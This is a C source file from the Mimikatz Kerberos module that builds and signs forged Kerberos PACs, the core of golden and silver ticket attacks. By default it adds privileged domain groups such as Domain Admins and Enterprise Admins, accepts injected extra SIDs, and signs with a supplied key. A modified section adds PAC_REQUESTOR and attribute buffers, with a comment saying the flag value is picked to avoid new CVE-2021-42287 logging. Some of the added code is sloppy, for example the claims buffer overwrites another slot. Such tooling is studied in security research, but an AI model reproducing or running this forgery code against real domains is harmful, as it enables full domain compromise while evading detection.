/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_kerberos_pac.h"

BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFILETIME authtime, LPCWSTR clientname, LONG SignatureType, PCLAIMS_SET pClaimsSet, PISID sid, DWORD userId, LPCWSTR domainname, PPACTYPE * pacType, DWORD * pacLength)
{
	BOOL status = FALSE;
	PVOID pLogonInfo = NULL, pClaims = NULL;
	PPAC_CLIENT_INFO pClientInfo = NULL;
	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
	DWORD n = 8, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 7 * sizeof(PAC_INFO_BUFFER);
	PKERB_CHECKSUM pCheckSum;
	INT pacAttributeType = 1; // Default to a value that doesnt show up on the new logs in CVE-2021-42287

	if(NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum)))
	{
		szSignature += pCheckSum->CheckSumSize;
		szSignatureAligned = SIZE_ALIGN(szSignature, 8);

		if(kull_m_pac_EncodeValidationInformation(&validationInfo, &pLogonInfo, &szLogonInfo))
			szLogonInfoAligned = SIZE_ALIGN(szLogonInfo, 8);
		if(kuhl_m_pac_validationInfo_to_CNAME_TINFO(authtime ? authtime : &validationInfo->LogonTime, clientname ? clientname : validationInfo->EffectiveName.Buffer, &pClientInfo, &szClientInfo))
			szClientInfoAligned = SIZE_ALIGN(szClientInfo, 8);
		if (pClaimsSet)
			if (kuhl_m_kerberos_claims_encode_ClaimsSet(pClaimsSet, &pClaims, &szClaims))
			{
				szClaimsAligned = SIZE_ALIGN(szClaims, 8);
				n++;
				offsetData += sizeof(PAC_INFO_BUFFER);
			}

		// Convert sid and id into user sid for PAC REQUESTOR using string conversersion and converting back to sids
		LPCWSTR stringSid;
		ConvertSidToStringSid(sid, &stringSid);
		LPCWSTR userStringSidFull[100];
		swprintf(userStringSidFull, 100, L"%s-%d", stringSid, userId );
		PSID userSid;
		ConvertStringSidToSid(userStringSidFull, &userSid);
		

		
		//// Test using LookupAccountName
		//PSID LANSid;
		//SID_NAME_USE snu = SidTypeInvalid;
		//BOOL bRVal;
		//DWORD dwSidSize = SECURITY_MAX_SID_SIZE;
		//WCHAR szDomainName[256];
		//DWORD dwDomainSize;
		//bRVal = LookupAccountName(
		//	NULL, //use this system
		//	validationInfo->EffectiveName.Buffer, //the user to look up
		//	&LANSid, //the returned SID
		//	&dwSidSize, //the size of the SID returned
		//	&szDomainName, //the returned domain name
		//	&dwDomainSize, //the size of the domain name
		//	&snu //the type of sid
		//);
		
		
		// Setting up PAC_REQUESTOR
		PAC_REQUESTOR requestor;
		requestor.sid = userSid;
		auto szPacRequestorsid = sizeof(PAC_REQUESTOR);
		DWORD szPacRequestorSidAligned = SIZE_ALIGN(szPacRequestorsid, 8);

		// Setting up PAC_ATTRIBUTE_IFNO
		PAC_ATTRIBUTES_INFO pacAttributeInfo;
		
		// This takes the value of 1 or 2 from pacAttributeType Arguement and inputs it as correct format. I am sure this is terrible but I couldnt get it to work another way.
		UINT32 pacAttributeTypeParser = NULL;
		
		if (pacAttributeType == 1) {
			pacAttributeTypeParser = PAC_ATTRIBUTE_FLAG_PAC_WAS_REQUESTED;
		}
		else if (pacAttributeType == 2) {
			pacAttributeTypeParser = PAC_ATTRIBUTE_FLAG_PAC_WAS_GIVEN_IMPLICITLY;
		}else{ 
			pacAttributeTypeParser = NULL;
		}

		if (pacAttributeTypeParser) { 
			kprintf(L"PAC Attribute Info: %zu\n", pacAttributeTypeParser);
			pacAttributeInfo.Flags[0] = pacAttributeTypeParser; 
		}
		else {
			kprintf(L"PAC Attribute Info is NULL");
		}
				

		auto szPacAttributeInfo = sizeof(PAC_ATTRIBUTES_INFO);
		DWORD szPacAttributeInfoAligned = SIZE_ALIGN(szPacAttributeInfo, 8);


		// Making UPN
		wchar_t upn[100];
		swprintf(upn, 100, L"%s@%s", validationInfo->EffectiveName.Buffer, domainname);
		wchar_t domainnameConverted[100];
		swprintf(domainnameConverted, 100, L"%s", domainname);

		

		// Setting UPN DNS INFO
		UPN_DNS_INFO upnDnsInfo;
		upnDnsInfo.DnsDomainNameLength = validationInfo->LogonDomainName.Length * 2;
		upnDnsInfo.DnsDomainNameOffset = 64;
		upnDnsInfo.UpnLength = lstrlenW(upn) * 2;
		upnDnsInfo.UpnOffset = 24;
		upnDnsInfo.Flags = 0x00000001;
		//upnDnsInfo.Upn = upn;
		//upnDnsInfo.Domain = domainnameConverted;

		

		auto szUpnDnsInfo = sizeof(UPN_DNS_INFO);
		auto szUpn = sizeof(upn);
		auto szDomainname = sizeof(domainnameConverted);
		DWORD szUpnAligned = SIZE_ALIGN(szUpn, 8);
		DWORD szDomainnameAligned = SIZE_ALIGN(szDomainname, 8);
		DWORD szUpnDnsInfoAligned = SIZE_ALIGN(szUpnDnsInfo, 8);

		if(pLogonInfo && pClientInfo)
		{
			*pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned + szUpnDnsInfoAligned + szUpnAligned + szDomainnameAligned + szPacAttributeInfoAligned + szPacRequestorSidAligned + 2 * szSignatureAligned;
			if(*pacType = (PPACTYPE) LocalAlloc(LPTR, *pacLength))
			{
				(*pacType)->cBuffers = n;
				(*pacType)->Version = 0;

				(*pacType)->Buffers[0].cbBufferSize = szLogonInfo;
				(*pacType)->Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
				(*pacType)->Buffers[0].Offset = offsetData;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[0].Offset, pLogonInfo, (*pacType)->Buffers[0].cbBufferSize);

				(*pacType)->Buffers[1].cbBufferSize = szClientInfo;
				(*pacType)->Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
				(*pacType)->Buffers[1].Offset = (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[1].Offset, pClientInfo, (*pacType)->Buffers[1].cbBufferSize);

				(*pacType)->Buffers[2].cbBufferSize = szUpnDnsInfo;
				(*pacType)->Buffers[2].ulType = PACINFO_TYPE_UPN_DNS;
				(*pacType)->Buffers[2].Offset = (*pacType)->Buffers[1].Offset + szClientInfoAligned;
				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset, &upnDnsInfo, (*pacType)->Buffers[2].cbBufferSize);
				//RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.UpnOffset, &upn, szUpn);
				//RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.DnsDomainNameOffset, &domainnameConverted, szDomainname);

				(*pacType)->Buffers[3].cbBufferSize = szUpn;
				(*pacType)->Buffers[3].ulType = PACINFO_TYPE_UPN_DNS;
				(*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned;
				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[3].Offset, &upn, (*pacType)->Buffers[3].cbBufferSize);

				(*pacType)->Buffers[4].cbBufferSize = szDomainname;
				(*pacType)->Buffers[4].ulType = PACINFO_TYPE_UPN_DNS;
				(*pacType)->Buffers[4].Offset = (*pacType)->Buffers[3].Offset + szUpnAligned;
				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[4].Offset, &domainnameConverted, (*pacType)->Buffers[4].cbBufferSize);

				(*pacType)->Buffers[5].cbBufferSize = szPacAttributeInfo;
				(*pacType)->Buffers[5].ulType = PACINFO_TYPE_ATTRIBUTES_INFO;
				(*pacType)->Buffers[5].Offset = (*pacType)->Buffers[4].Offset + szDomainnameAligned;
				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[5].Offset, &pacAttributeInfo, (*pacType)->Buffers[5].cbBufferSize);

				(*pacType)->Buffers[6].cbBufferSize = szPacRequestorsid;
				(*pacType)->Buffers[6].ulType = PACINFO_TYPE_PAC_REQUESTOR;
				(*pacType)->Buffers[6].Offset = (*pacType)->Buffers[5].Offset + szPacAttributeInfoAligned;
				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[6].Offset, &requestor, (*pacType)->Buffers[6].cbBufferSize);

				if (szClaimsAligned)
				{
					(*pacType)->Buffers[5].cbBufferSize = szClaims;
					(*pacType)->Buffers[5].ulType = PACINFO_TYPE_CLIENT_CLAIMS;
					(*pacType)->Buffers[5].Offset = (*pacType)->Buffers[4].Offset + szClientInfoAligned;
					RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[5].Offset, pClaims, (*pacType)->Buffers[5].cbBufferSize);
				}

				(*pacType)->Buffers[n - 2].cbBufferSize = szSignature;
				(*pacType)->Buffers[n - 2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
				(*pacType)->Buffers[n - 2].Offset = (*pacType)->Buffers[n - 3].Offset + SIZE_ALIGN((*pacType)->Buffers[n - 3].cbBufferSize, 8);
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[n - 2].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

				(*pacType)->Buffers[n - 1].cbBufferSize = szSignature;
				(*pacType)->Buffers[n - 1].ulType = PACINFO_TYPE_CHECKSUM_KDC;
				(*pacType)->Buffers[n - 1].Offset = (*pacType)->Buffers[n - 2].Offset + szSignatureAligned;
				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[n - 1].Offset, &signature, FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature));

				status = TRUE;
			}
		}

		if(pLogonInfo)
			LocalFree(pLogonInfo);
		if(pClientInfo)
			LocalFree(pClientInfo);
		if(pClaims)
			LocalFree(pClaims);
	}
	return status;
}

NTSTATUS kuhl_m_pac_signature(PPACTYPE pacType, DWORD pacLenght, LONG SignatureType, LPCVOID key, DWORD keySize)
{
	NTSTATUS status;
	DWORD i;
	PKERB_CHECKSUM pCheckSum;
	PVOID Context;
	PPAC_SIGNATURE_DATA pSignatureData;
	PBYTE checksumSrv = NULL, checksumpKdc = NULL;

	status = CDLocateCheckSum(SignatureType, &pCheckSum);
	if(NT_SUCCESS(status))
	{
		status = STATUS_NOT_FOUND;
		for(i = 0; i < pacType->cBuffers; i++)
		{
			if((pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV) || (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_KDC))
			{
				pSignatureData = (PPAC_SIGNATURE_DATA) ((PBYTE) pacType + pacType->Buffers[i].Offset);
				RtlZeroMemory(pSignatureData->Signature, pCheckSum->CheckSumSize);
				if(pacType->Buffers[i].ulType ==  PACINFO_TYPE_CHECKSUM_SRV)
					checksumSrv = pSignatureData->Signature;
				else
					checksumpKdc = pSignatureData->Signature;
			}
		}
		if(checksumSrv && checksumpKdc)
		{
			status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT, &Context);
			if(NT_SUCCESS(status))
			{
				pCheckSum->Sum(Context, pacLenght, pacType);
				pCheckSum->Finalize(Context, checksumSrv);
				pCheckSum->Finish(&Context);
				status = pCheckSum->InitializeEx(key, keySize, KERB_NON_KERB_CKSUM_SALT, &Context);
				if(NT_SUCCESS(status))
				{
					pCheckSum->Sum(Context, pCheckSum->CheckSumSize, checksumSrv);
					pCheckSum->Finalize(Context, checksumpKdc);
					pCheckSum->Finish(&Context);
				}
			}
		}
	}
	return status;
}

BOOL kuhl_m_pac_validationInfo_to_CNAME_TINFO(PFILETIME authtime, LPCWSTR clientname, PPAC_CLIENT_INFO * pacClientInfo, DWORD * pacClientInfoLength)
{
	BOOL status = FALSE;
	DWORD len = lstrlen(clientname) * sizeof(wchar_t);

	*pacClientInfoLength = sizeof(PAC_CLIENT_INFO) + len - sizeof(wchar_t);
	if(*pacClientInfo = (PPAC_CLIENT_INFO) LocalAlloc(LPTR, *pacClientInfoLength))
	{
		(*pacClientInfo)->ClientId = *authtime;
		(*pacClientInfo)->NameLength = (USHORT) len;
		RtlCopyMemory((*pacClientInfo)->Name, clientname, len);
		status = TRUE;
	}
	return status;
}

PKERB_VALIDATION_INFO kuhl_m_pac_infoToValidationInfo(PFILETIME authtime, LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, PISID sid, ULONG rid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids)
{
	PKERB_VALIDATION_INFO validationInfo = NULL;
	if(validationInfo = (PKERB_VALIDATION_INFO) LocalAlloc(LPTR, sizeof(KERB_VALIDATION_INFO)))
	{
		validationInfo->LogonTime = *authtime;
		KIWI_NEVERTIME(&validationInfo->LogoffTime);
		KIWI_NEVERTIME(&validationInfo->KickOffTime);
		KIWI_NEVERTIME(&validationInfo->PasswordLastSet);
		KIWI_NEVERTIME(&validationInfo->PasswordCanChange);
		KIWI_NEVERTIME(&validationInfo->PasswordMustChange);
		RtlInitUnicodeString(&validationInfo->EffectiveName, username);
		validationInfo->UserId = rid;
		validationInfo->PrimaryGroupId = groups[0].RelativeId;
		validationInfo->GroupCount = cbGroups;
		validationInfo->GroupIds = groups;
		if(LogonDomainName)
			RtlInitUnicodeString(&validationInfo->LogonDomainName, LogonDomainName);
		validationInfo->LogonDomainId = sid;
		validationInfo->UserAccountControl = USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
		validationInfo->SidCount = cbSids;
		validationInfo->ExtraSids = sids;
		//validationInfo->ResourceGroupDomainSid = NULL;
		//validationInfo->ResourceGroupCount = 0;
		//validationInfo->ResourceGroupIds = NULL;
		if(validationInfo->ExtraSids && validationInfo->SidCount)
			validationInfo->UserFlags |= 0x20;
		//if(validationInfo->ResourceGroupDomainSid && validationInfo->ResourceGroupIds && validationInfo->ResourceGroupCount)
		//	validationInfo->UserFlags |= 0x200;
	}
	return validationInfo;
}

GROUP_MEMBERSHIP kuhl_m_pac_stringTogroups_defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
BOOL kuhl_m_pac_stringToGroups(PCWSTR szGroups, PGROUP_MEMBERSHIP *groups, DWORD *cbGroups)
{
	PWSTR dupGroup, nextSetToken, SetToken;
	DWORD i;
	*groups = NULL;
	*cbGroups = 0;
	if(szGroups)
	{
		if(dupGroup = _wcsdup(szGroups))
		{
			for(nextSetToken = NULL, SetToken = wcstok_s(dupGroup, L",", &nextSetToken); SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
				if(wcstoul(SetToken, NULL, 0))
					(*cbGroups)++;
			free(dupGroup);
		}
		if(*cbGroups && (*groups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, *cbGroups * sizeof(GROUP_MEMBERSHIP))))
		{
			if(dupGroup = _wcsdup(szGroups))
			{
				for(i = 0, nextSetToken = NULL, SetToken = wcstok_s(dupGroup, L",", &nextSetToken); (i < *cbGroups) && SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
					if((*groups)[i].RelativeId = wcstoul(SetToken, NULL, 0))
						(*groups)[i++].Attributes = DEFAULT_GROUP_ATTRIBUTES;
				free(dupGroup);
			}
		}
	}
	if(!*groups)
	{
		if(*groups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, sizeof(kuhl_m_pac_stringTogroups_defaultGroups)))
		{
			RtlCopyMemory(*groups, kuhl_m_pac_stringTogroups_defaultGroups, sizeof(kuhl_m_pac_stringTogroups_defaultGroups));
			*cbGroups = ARRAYSIZE(kuhl_m_pac_stringTogroups_defaultGroups);
		}
	}
	return (*groups && *cbGroups);
}

BOOL kuhl_m_pac_stringToSids(PCWSTR szSids, PKERB_SID_AND_ATTRIBUTES *sids, DWORD *cbSids)
{
	PWSTR dupSids, nextSetToken, SetToken;
	DWORD i;
	PSID tmp = NULL;
	*sids = NULL;
	*cbSids = 0;
	if(szSids)
	{
		if(dupSids = _wcsdup(szSids))
		{
			for(nextSetToken = NULL, SetToken = wcstok_s(dupSids, L",", &nextSetToken); SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
			{
				if(ConvertStringSidToSid(SetToken, &tmp))
				{
					(*cbSids)++;
					LocalFree(tmp);
				}
			}
			free(dupSids);
		}
		if(*cbSids && (*sids = (PKERB_SID_AND_ATTRIBUTES) LocalAlloc(LPTR, *cbSids * sizeof(KERB_SID_AND_ATTRIBUTES))))
		{
			if(dupSids = _wcsdup(szSids))
			{
				for(i = 0, nextSetToken = NULL, SetToken = wcstok_s(dupSids, L",", &nextSetToken); (i < *cbSids) && SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
					if(ConvertStringSidToSid(SetToken, (PSID *) &(*sids)[i].Sid))
						(*sids)[i++].Attributes = DEFAULT_GROUP_ATTRIBUTES;
				free(dupSids);
			}
		}
	}
	return (*sids && *cbSids);
}

#if defined(KERBEROS_TOOLS)
NTSTATUS kuhl_m_kerberos_pac_info(int argc, wchar_t * argv[])
{
	PPACTYPE pacType;
	DWORD pacLenght, i, j;
	PKERB_VALIDATION_INFO pValInfo = NULL;
	PPAC_SIGNATURE_DATA pSignatureData;
	PPAC_CLIENT_INFO pClientInfo;
	PUPN_DNS_INFO pUpnDnsInfo;
	PCLAIMS_SET_METADATA pClaimsSetMetadata = NULL;
	PCLAIMS_SET claimsSet = NULL;
	PPAC_CREDENTIAL_INFO pCredentialInfo;

	if(argc)
	{
		if(kull_m_file_readData(argv[0], (PBYTE *) &pacType, &pacLenght))
		{
			kprintf(L"version %u, nbBuffer = %u\n\n", pacType->Version, pacType->cBuffers);

			for(i = 0; i < pacType->cBuffers; i++)
			{
				switch(pacType->Buffers[i].ulType)
				{
				case PACINFO_TYPE_LOGON_INFO:
					kprintf(L"*** Validation Informations *** (%u)\n", pacType->Buffers[i].cbBufferSize);
					if(kull_m_pac_DecodeValidationInformation((PBYTE) pacType + pacType->Buffers[i].Offset, pacType->Buffers[i].cbBufferSize, &pValInfo))
					{
						kprintf(L"LogonTime              %016llx - ", pValInfo->LogonTime); kull_m_string_displayLocalFileTime(&pValInfo->LogonTime); kprintf(L"\n");
						kprintf(L"LogoffTime             %016llx - ", pValInfo->LogoffTime); kull_m_string_displayLocalFileTime(&pValInfo->LogoffTime); kprintf(L"\n");
						kprintf(L"KickOffTime            %016llx - ", pValInfo->KickOffTime); kull_m_string_displayLocalFileTime(&pValInfo->KickOffTime); kprintf(L"\n");
						kprintf(L"PasswordLastSet        %016llx - ", pValInfo->PasswordLastSet); kull_m_string_displayLocalFileTime(&pValInfo->PasswordLastSet); kprintf(L"\n");
						kprintf(L"PasswordCanChange      %016llx - ", pValInfo->PasswordCanChange); kull_m_string_displayLocalFileTime(&pValInfo->PasswordCanChange); kprintf(L"\n");
						kprintf(L"PasswordMustChange     %016llx - ", pValInfo->PasswordMustChange); kull_m_string_displayLocalFileTime(&pValInfo->PasswordMustChange); kprintf(L"\n");
						kprintf(L"EffectiveName          %wZ\n", &pValInfo->EffectiveName);
						kprintf(L"FullName               %wZ\n", &pValInfo->FullName);
						kprintf(L"LogonScript            %wZ\n", &pValInfo->LogonScript);
						kprintf(L"ProfilePath            %wZ\n", &pValInfo->ProfilePath);
						kprintf(L"HomeDirectory          %wZ\n", &pValInfo->HomeDirectory);
						kprintf(L"HomeDirectoryDrive     %wZ\n", &pValInfo->HomeDirectoryDrive);
						kprintf(L"LogonCount             %hu\n", pValInfo->LogonCount);
						kprintf(L"BadPasswordCount       %hu\n", pValInfo->BadPasswordCount);
						kprintf(L"UserId                 %08x (%u)\n", pValInfo->UserId, pValInfo->UserId);
						kprintf(L"PrimaryGroupId         %08x (%u)\n", pValInfo->PrimaryGroupId, pValInfo->PrimaryGroupId);
						kprintf(L"GroupCount             %u\n", pValInfo->GroupCount);
						kprintf(L"GroupIds               ");
						for(j = 0; j < pValInfo->GroupCount; j++)
							kprintf(L"%u, ", pValInfo->GroupIds[j].RelativeId); //, pGroup[j].Attributes);
						kprintf(L"\n");
						kprintf(L"UserFlags              %08x (%u)\n", pValInfo->UserFlags, pValInfo->UserFlags);
						kprintf(L"UserSessionKey         "); kull_m_string_wprintf_hex(pValInfo->UserSessionKey.data, 16, 0); kprintf(L"\n");
						kprintf(L"LogonServer            %wZ\n", &pValInfo->LogonServer);
						kprintf(L"LogonDomainName        %wZ\n", &pValInfo->LogonDomainName);
						kprintf(L"LogonDomainId          "); kull_m_string_displaySID(pValInfo->LogonDomainId); kprintf(L"\n");
						kprintf(L"UserAccountControl     %08x (%u)\n", pValInfo->UserAccountControl, pValInfo->UserAccountControl);
						kprintf(L"SubAuthStatus          %08x (%u)\n", pValInfo->SubAuthStatus, pValInfo->SubAuthStatus);
						kprintf(L"LastSuccessfulILogon   %016llx - ", pValInfo->LastSuccessfulILogon); kull_m_string_displayLocalFileTime(&pValInfo->LastSuccessfulILogon); kprintf(L"\n");
						kprintf(L"LastFailedILogon       %016llx - ", pValInfo->LastFailedILogon); kull_m_string_displayLocalFileTime(&pValInfo->LastFailedILogon); kprintf(L"\n");
						kprintf(L"FailedILogonCount      %08x (%u)\n", pValInfo->FailedILogonCount, pValInfo->FailedILogonCount);
						kprintf(L"SidCount               %u\n", pValInfo->SidCount);
						kprintf(L"ExtraSids\n");
						for(j = 0; j < pValInfo->SidCount; j++)
						{
							kprintf(L"  ");
							kull_m_string_displaySID(pValInfo->ExtraSids[j].Sid);
							kprintf(L"\n");
						}
						kprintf(L"ResourceGroupDomainSid "); if(pValInfo->ResourceGroupDomainSid) kull_m_string_displaySID(pValInfo->ResourceGroupDomainSid); kprintf(L"\n");
						kprintf(L"ResourceGroupCount     %u\n", pValInfo->ResourceGroupCount);
						kprintf(L"ResourceGroupIds       ");
						for(j = 0; j < pValInfo->ResourceGroupCount; j++)
							kprintf(L"%u, ", pValInfo->ResourceGroupIds[j].RelativeId); //, pGroup[j].Attributes);
						kprintf(L"\n");
						kull_m_pac_FreeValidationInformation(&pValInfo);
					}
					break;
				case PACINFO_TYPE_CHECKSUM_SRV: // Server Signature
				case PACINFO_TYPE_CHECKSUM_KDC: // KDC Signature
					pSignatureData = (PPAC_SIGNATURE_DATA) ((PBYTE) pacType + pacType->Buffers[i].Offset);
					kprintf(L"*** %s Signature ***\n", (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV) ? L"Server" : L"KDC");
					kprintf(L"Type %08x - (%hu) : ", pSignatureData->SignatureType, 0);//pSignatureData->RODCIdentifier);
					kull_m_string_wprintf_hex(pSignatureData->Signature, (pSignatureData->SignatureType == KERB_CHECKSUM_HMAC_MD5) ? LM_NTLM_HASH_LENGTH : 12, 0);
					kprintf(L"\n");
					break;
				case PACINFO_TYPE_CNAME_TINFO: // Client name and ticket information
					pClientInfo  = (PPAC_CLIENT_INFO) ((PBYTE) pacType + pacType->Buffers[i].Offset);
					kprintf(L"*** Client name and ticket information ***\n");
					kprintf(L"ClientId %016llx - ", pClientInfo->ClientId); kull_m_string_displayLocalFileTime(&pClientInfo->ClientId); kprintf(L"\n");
					kprintf(L"Client   %.*s\n", pClientInfo->NameLength / sizeof(WCHAR), pClientInfo->Name);
					break;
				case PACINFO_TYPE_UPN_DNS:
					pUpnDnsInfo = (PUPN_DNS_INFO) ((PBYTE) pacType + pacType->Buffers[i].Offset);
					kprintf(L"*** UPN and DNS information ***\n");
					kprintf(L"UPN            %.*s\n", pUpnDnsInfo->UpnLength / sizeof(WCHAR), (PBYTE) pUpnDnsInfo + pUpnDnsInfo->UpnOffset);
					kprintf(L"DnsDomainName  %.*s\n", pUpnDnsInfo->DnsDomainNameLength / sizeof(WCHAR), (PBYTE) pUpnDnsInfo + pUpnDnsInfo->DnsDomainNameOffset);
					kprintf(L"Flags          %08x (%u)\n", pUpnDnsInfo->Flags, pUpnDnsInfo->Flags);
					break;
				case PACINFO_TYPE_CLIENT_CLAIMS:
				case PACINFO_TYPE_DEVICE_CLAIMS:
					kprintf(L"*** %s claims Informations *** (%u)\n", (pacType->Buffers[i].ulType == PACINFO_TYPE_CLIENT_CLAIMS) ? L"Client" : L"Device", pacType->Buffers[i].cbBufferSize);
					if(pacType->Buffers[i].cbBufferSize)
					{
						kull_m_string_wprintf_hex((PBYTE) pacType + pacType->Buffers[i].Offset, pacType->Buffers[i].cbBufferSize, 2);
						if(kull_m_rpc_DecodeClaimsSetMetaData((PBYTE) pacType + pacType->Buffers[i].Offset, pacType->Buffers[i].cbBufferSize, &pClaimsSetMetadata))
						{
							if(pClaimsSetMetadata->usCompressionFormat == CLAIMS_COMPRESSION_FORMAT_NONE)
							{
								if(kull_m_rpc_DecodeClaimsSet(pClaimsSetMetadata->ClaimsSet, pClaimsSetMetadata->ulUncompressedClaimsSetSize, &claimsSet))
								{
									kuhl_m_kerberos_claims_displayClaimsSet(claimsSet);
									kull_m_rpc_FreeClaimsSet(&claimsSet);
								}
							}
							else PRINT_ERROR(L"Compression not supported (%hu)\n", pClaimsSetMetadata->usCompressionFormat);
							kull_m_rpc_FreeClaimsSetMetaData(&pClaimsSetMetadata);
						}
					}
					break;
				case PACINFO_TYPE_CREDENTIALS_INFO:
					kprintf(L"*** Credential information *** (%u)\n", pacType->Buffers[i].cbBufferSize);
					pCredentialInfo = (PPAC_CREDENTIAL_INFO) ((PBYTE) pacType + pacType->Buffers[i].Offset);
					j = pacType->Buffers[i].cbBufferSize - FIELD_OFFSET(PAC_CREDENTIAL_INFO, SerializedData);
					kprintf(L"Version: %u\n", pCredentialInfo->Version);
					kprintf(L"Encryption type: %08x (%u)\n", pCredentialInfo->EncryptionType, pCredentialInfo->EncryptionType);
					kull_m_string_wprintf_hex(pCredentialInfo->SerializedData, j, 1 | (16 << 16));
					kprintf(L"\n");
					break;
				case PACINFO_TYPE_ATTRIBUTES_INFO:
					kprintf("PAC ATTRIBUTES INFO");
					break;
				case PACINFO_TYPE_PAC_REQUESTOR:
					kprintf("PAC REQUESTOR");
					break;
				default:
					kull_m_string_wprintf_hex(&pacType->Buffers[i], sizeof(PAC_INFO_BUFFER), 1);
					kprintf(L"\n");
					kprintf(L"[%02u] %08x @ offset %016llx (%u)\n", i, pacType->Buffers[i].ulType, pacType->Buffers[i].Offset, pacType->Buffers[i].cbBufferSize);
					kull_m_string_wprintf_hex((PBYTE) pacType + pacType->Buffers[i].Offset, pacType->Buffers[i].cbBufferSize, 1);
					kprintf(L"-");
					
				}
				kprintf(L"\n");
			}
			LocalFree(pacType);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	return STATUS_SUCCESS;
}
#endif